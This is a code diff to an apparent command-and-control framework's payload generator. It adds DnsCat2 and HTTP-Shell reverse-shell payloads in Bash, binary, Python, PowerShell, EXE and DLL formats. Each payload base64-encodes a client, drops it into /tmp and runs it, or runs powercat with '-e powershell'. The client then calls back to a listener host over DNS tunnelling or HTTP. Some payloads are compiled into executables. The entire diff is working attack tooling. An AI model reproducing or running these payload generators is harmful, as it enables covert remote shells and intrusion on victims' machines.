@@ -103,7 +103,131 @@ def generate_payload(app, tail, file_format, listener_name):
             compiler.create_c_file(content, dst_file, "dll")
             compiler.compile_dll_file(dst_file)
 
+    if tail == "DnsCat2":
+        if file_format == "Bash":
+            src_file = "tails/dnscat2/client/dnscat"
+            dst_name = "DnsCat2_" + str(listener_port) + ".sh"
+            dst_file = os.path.join(payloads_dir, dst_name.lower())        
+
+            with open(src_file, 'rb') as file:
+                content = file.read()
+
+            payload = base64.b64encode(content).decode('utf-8')
+            content = (f"echo '{payload}' | base64 -di > /tmp/dnscat2 ; chmod +x /tmp/dnscat2 ; /tmp/dnscat2 --dns 'server={listener_host},port={listener_port},domain=kit.su.ne'")
+            
+            with open(dst_file, 'w') as file:
+                file.writelines(content)
+
+        if file_format == "Binary":
+            src_file = "tails/dnscat2/client/dnscat"
+            dst_name = "DnsCat2_" + str(listener_port)
+            dst_file = os.path.join(payloads_dir, dst_name.lower())        
+
+            with open(src_file, 'rb') as file:
+                content = file.read()
+            
+            payload = base64.b64encode(content).decode('utf-8')
+            content = (f"echo '{payload}' | base64 -di > /tmp/dnscat2 ; chmod +x /tmp/dnscat2 ; /tmp/dnscat2 --dns 'server={listener_host},port={listener_port},domain=kit.su.ne'")
+            compiler.create_c_file(content, dst_file, "bin")
+            compiler.compile_bin_file(dst_file)
+
+        if file_format == "Python 3":
+            src_file = "tails/dnscat2/client/dnscat"
+            dst_name = "DnsCat2_" + str(listener_port) + ".py"
+            dst_file = os.path.join(payloads_dir, dst_name.lower())        
+
+            with open(src_file, 'rb') as file:
+                content = file.read()
+            
+            payload = base64.b64encode(content).decode('utf-8')
+            content = (f"echo '{payload}' | base64 -di > /tmp/dnscat2 ; chmod +x /tmp/dnscat2 ; /tmp/dnscat2 --dns 'server={listener_host},port={listener_port},domain=kit.su.ne'")
+            compiler.create_py_file(content, dst_file)
+
+        if file_format == "Ps1":
+            src_file = "tails/dnscat2/client/win32/powercat/powercat.ps1"
+            dst_name = "DnsCat2_" + str(listener_port) + ".ps1"
+            dst_file = os.path.join(payloads_dir, dst_name.lower())
+            
+            with open(src_file, 'r') as file:
+                content = file.readlines()
+            
+            content.append(f"\npowercat -c {listener_host} -p {listener_port} -dns kit.su.ne -e powershell\n")
+            
+            with open(dst_file, 'w') as file:
+                file.writelines(content)
+
+        if file_format == "Exe":
+            src_file = "tails/dnscat2/client/win32/powercat/powercat.ps1"
+            dst_name = "DnsCat2_" + str(listener_port)
+            dst_file = os.path.join(payloads_dir, dst_name.lower())
+            
+            with open(src_file, 'r') as file:
+                content = file.readlines()
+            
+            content.append(f"\npowercat -c {listener_host} -p {listener_port} -dns kit.su.ne -e powershell\n")
+            content = " ".join(content)
+            content = base64.b64encode(content.encode('utf16')[2:]).decode()
+            compiler.create_c_file(content, dst_file, "exe")
+            compiler.compile_exe_file(dst_file)
+
+        if file_format == "Dll":
+            src_file = "tails/dnscat2/client/win32/powercat/powercat.ps1"
+            dst_name = "DnsCat2_" + str(listener_port)
+            dst_file = os.path.join(payloads_dir, dst_name.lower())
+            
+            with open(src_file, 'r') as file:
+                content = file.readlines()
+            
+            content.append(f"\npowercat -c {listener_host} -p {listener_port} -dns kit.su.ne -e powershell\n")
+            content = " ".join(content)
+            content = base64.b64encode(content.encode('utf16')[2:]).decode()
+            compiler.create_c_file(content, dst_file, "exe")
+            compiler.compile_dll_file(dst_file)
+
     elif tail == "HTTP-Shell":
+        if file_format == "Bash":
+            src_file = "tails/HTTP-Shell/HTTP-Client.sh"
+            dst_name = "HTTP-Shell_" + str(listener_port) + ".sh"
+            dst_file = os.path.join(payloads_dir, dst_name.lower())
+            
+            with open(src_file, 'r') as file:
+                content = file.readlines()
+            
+            content.insert(6, "HTTPShell() {\n\n")
+            content.append(f"\n}}\n\nHTTPShell -c {listener_host}:{listener_port}\n")
+            
+            with open(dst_file, 'w') as file:
+                file.writelines(content)
+
+        if file_format == "Binary":
+            src_file = "tails/HTTP-Shell/HTTP-Client.sh"
+            dst_name = "HTTP-Shell_" + str(listener_port)
+            dst_file = os.path.join(payloads_dir, dst_name.lower())
+            
+            with open(src_file, 'r') as file:
+                content = file.readlines()
+            
+            content.insert(6, "HTTPShell() {\n\n")
+            content.append(f"\n}}\n\nHTTPShell -c {listener_host}:{listener_port}\n")  
+            payload = str(base64.b64encode(str(" ".join(content)).encode('utf8')).decode())
+            content = "echo " + payload + " | base64 -di | bash"
+            compiler.create_c_file(content, dst_file, "bin")
+            compiler.compile_bin_file(dst_file)
+
+        if file_format == "Python 3":
+            src_file = "tails/HTTP-Shell/HTTP-Client.sh"
+            dst_name = "HTTP-Shell_" + str(listener_port) + ".py"
+            dst_file = os.path.join(payloads_dir, dst_name.lower())
+            
+            with open(src_file, 'r') as file:
+                content = file.readlines()
+            
+            content.insert(6, "HTTPShell() {\n\n")
+            content.append(f"\n}}\n\nHTTPShell -c {listener_host}:{listener_port}\n")  
+            payload = str(base64.b64encode(str(''.join(content)).encode('utf8')).decode())
+            content = "echo " + payload + " | base64 -di | bash"
+            compiler.create_py_file(content, dst_file)
+
         if file_format == "Ps1":
             src_file = "tails/HTTP-Shell/HTTP-Client.ps1"
             dst_name = "HTTP-Shell_" + str(listener_port) + ".ps1"
